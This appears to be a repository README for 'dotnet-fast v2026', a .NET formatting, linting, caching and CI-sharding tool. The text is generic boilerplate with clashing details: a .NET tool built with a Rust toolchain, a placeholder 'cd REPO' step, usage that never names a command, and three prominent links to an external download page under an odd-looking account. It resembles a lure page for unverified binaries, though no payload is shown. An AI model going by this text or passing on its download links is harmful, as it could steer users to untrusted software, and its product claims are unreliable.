# dotnet-fast v2026 - .NET workspace tooling 2026

> **Speed-focused .NET workspace tooling for Windows, Linux, and macOS, built to help teams format, lint, cache, and shard CI work more efficiently in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-Windows/Linux/macOS-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/woodjordanvbpf3851/dotnet-fast-windows-ci?style=flat-square)](https://github.com/woodjordanvbpf3851/dotnet-fast-windows-ci)

---

<p align="center">
  <a href="https://woodjordanvbpf3851.github.io/dotnet-fast-windows-ci/">
    <img src="https://img.shields.io/badge/Download-dotnet-fast%20Latest-brightgreen?style=for-the-badge" alt="Download dotnet-fast">
  </a>
</p>

> **[Direct Download - dotnet-fast v2026](https://woodjordanvbpf3851.github.io/dotnet-fast-windows-ci/)**

---

[Download Latest Build](https://woodjordanvbpf3851.github.io/dotnet-fast-windows-ci/)

---

## What dotnet-fast does

dotnet-fast is a .NET workspace utility aimed at fast-moving repositories and CI-aware development. It brings formatting, linting, affected-project detection, remote caching, and test splitting into one workflow so teams can use the same tool locally and in automation.

It is especially useful in monorepos and other multi-project codebases where changes ripple across many projects. Because it can produce machine-readable output and SARIF, it integrates cleanly with build orchestration, review tooling, and CI platforms without requiring a separate process for every task.

---

## Key capabilities

- Fast .NET formatting and linting workflow
- Affected-project detection based on Git changes
- Azure Blob remote build cache support
- NUnit test sharding for CI pipelines
- SARIF output for code scanning integration
- Machine-readable JSON output for automation
- Works with Azure DevOps and GitHub Actions
- Fits monorepo and multi-project repository layouts

---

## Installation

Get the repository by cloning or downloading it, then build or run it from the project root.

git clone https://github.com/woodjordanvbpf3851/dotnet-fast-windows-ci.git
cd REPO

If you are using a release build or packaged binary, download it from the project download page and run the matching executable for your platform.

For local development, use the standard Rust toolchain to compile the workspace and launch the resulting binary.

cargo build --release
./target/release/dotnet-fast

---

## Usage

Point dotnet-fast at your repository when you need to validate formatting, inspect changed projects, or prepare CI work more efficiently.

Typical ways to use it include:

1. Detect which projects are affected by a set of Git changes.
2. Run formatting or linting only where it is needed.
3. Use the Azure Blob cache to reuse build output across runs.
4. Split NUnit tests into shards for faster CI execution.
5. Export results as JSON when another tool needs to read them.
6. Emit SARIF when you want to feed findings into code scanning.

Exact commands will vary with your CI structure and repository layout, but the basic approach is to aim dotnet-fast at the workspace and select the task you want to optimize.

---

## Configuration

dotnet-fast is meant to be wired into your repository or CI pipeline setup. Store task settings, cache details, and test distribution choices in the files or environment variables already used by your build system.

A typical setup may look like this:

{
  "cache": {
    "provider": "azure-blob"
  },
  "output": {
    "format": "json"
  },
  "ci": {
    "testSharding": true
  }
}

If your workflow already defines formatting, linting, or test commands, connect dotnet-fast to those existing conventions rather than duplicating them.

---

## Requirements

- Windows, Linux, or macOS
- A .NET workspace or repository that uses C#
- Rust toolchain for building from source
- Git for affected-project detection
- Azure Blob storage if you plan to use remote build caching
- Azure DevOps or GitHub Actions for CI sharding workflows
- Repository access suitable for the commands and caches you configure

---

## FAQ

**How do I update dotnet-fast?**  
Install the latest release or rebuild from source whenever the repository changes.

**Can I use it outside CI?**  
Yes. It works well for local workspace checks in addition to automated pipelines.

**Where do I configure cache or test sharding behavior?**  
Use repository configuration, pipeline settings, or environment variables, depending on how you integrate the tool.

**What if I need output for another system?**  
Choose JSON for machine-readable workflows or SARIF for code scanning consumers.

**It is not behaving as expected. What should I check first?**  
Start with your Git state, workspace layout, pipeline variables, and any cache or test-sharding settings before troubleshooting the tool itself.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
